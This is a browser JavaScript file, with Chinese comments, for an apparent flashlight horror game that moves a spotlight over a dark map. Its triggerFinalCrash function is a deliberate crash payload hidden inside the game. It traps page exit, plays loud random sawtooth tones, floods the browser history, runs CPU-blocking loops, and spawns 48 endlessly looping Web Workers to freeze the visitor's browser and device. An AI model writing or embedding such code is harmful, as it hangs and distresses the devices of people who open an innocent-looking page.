let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let systemCrashed = false;

// 用於手機拖拽的變數
let isDragging = false;
let lastTouchX = 0;
let lastTouchY = 0;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// --- 核心啟動函式 (PC 鍵盤或手機點擊皆可) ---
function startGame() {
    if (systemCrashed || audioStarted) return;
    
    // 1. 隱藏 Intro 文字
    if (intro) intro.style.display = 'none';
    
    // 2. 請求全屏 (手機必備，用來隱藏瀏覽器工具欄)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
    
    // 3. 啟動聲音與手電筒
    startCreepyVoice();
    isLightOn = true;
    
    // 初始化手電筒位置
    updateFlashlight(mouseX, mouseY);
}

// 1. 音效系統
function startCreepyVoice() {
    if (audioStarted) return;
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;

    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.9;
            } else {
                let n = Math.random() * 0.1;
                let g = (t & (t >> 8)) ? 0.05 : -0.05;
                output[i] = n + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 2. 生成 Glitch 塊 (30秒後出現)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    
    // 將方塊生成在當前視線中心附近
    let spawnX = -posX + (window.innerWidth / 2) + 100;
    let spawnY = -posY + (window.innerHeight / 2) + 100;

    glitchBlock.style.cssText = `
        position: absolute; width: 40px; height: 40px;
        background: white; z-index: 1001;
        left: ${spawnX}px; top: ${spawnY}px;
        box-shadow: 0 0 25px white;
    `;
    map.appendChild(glitchBlock);

    setInterval(() => {
        glitchBlock.style.background = Math.random() > 0.5 ? 'white' : 'black';
    }, 50);

    const checkArrival = setInterval(() => {
        const rect = glitchBlock.getBoundingClientRect();
        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;
        // 判定撞擊
        if (Math.abs(rect.left + 20 - centerX) < 50 && Math.abs(rect.top + 20 - centerY) < 50) {
            triggerFinalCrash();
            clearInterval(checkArrival);
        }
    }, 50);
}, 30000);

// 3. 核心：0.3秒絕殺凍結
function triggerFinalCrash() {
    systemCrashed = true;
    window.onbeforeunload = function () { return "HELP ME."; };

    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    setTimeout(() => {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let osc = audioCtx.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.value = 40 + Math.random() * 4000;
            osc.connect(audioCtx.destination);
            osc.start();
        }, 15);

        function absoluteLock() {
            for (let i = 0; i < 400; i++) {
                window.history.pushState(null, null, "#" + Math.random());
            }
            const start = Date.now();
            while (Date.now() - start < 800) {
                const data = new Array(1000000).fill("DEAD");
                JSON.stringify(data);
            }
            setTimeout(absoluteLock, 0);
        }

        const blobCode = `while(true){ postMessage(new Array(1000000).join("HELP")); }`;
        const url = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
        for (let i = 0; i < 48; i++) { new Worker(url); }

        absoluteLock();
    }, 300);
}

// 4. 控制邏輯 (手電筒更新)
function updateFlashlight(x, y) {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

// --- 事件監聽 (全平台適配) ---

// PC 滑鼠移動
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight(mouseX, mouseY);
});

// PC 鍵盤操作
window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    if (key === 'f') startGame();
    
    const s = 60;
    if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

// 手機/iPad 觸摸操作 (點擊啟動 + 拖拽移動)
window.addEventListener('touchstart', (e) => {
    if (!audioStarted) startGame(); // 觸摸即啟動
    
    isDragging = true;
    lastTouchX = e.touches[0].clientX;
    lastTouchY = e.touches[0].clientY;
    
    // 更新手電筒位置到手指觸碰處
    updateFlashlight(lastTouchX, lastTouchY);
}, { passive: false });

window.addEventListener('touchmove', (e) => {
    if (systemCrashed || !isDragging) return;
    e.preventDefault(); // 防止畫面捲動
    
    let touchX = e.touches[0].clientX;
    let touchY = e.touches[0].clientY;
    
    // 計算移動距離
    let dx = touchX - lastTouchX;
    let dy = touchY - lastTouchY;
    
    posX += dx;
    posY += dy;
    
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight(touchX, touchY);
    
    lastTouchX = touchX;
    lastTouchY = touchY;
}, { passive: false });

window.addEventListener('touchend', () => {
    isDragging = false;
});

// 點擊啟動備份 (針對某些瀏覽器)
window.addEventListener('click', startGame, { once: true });
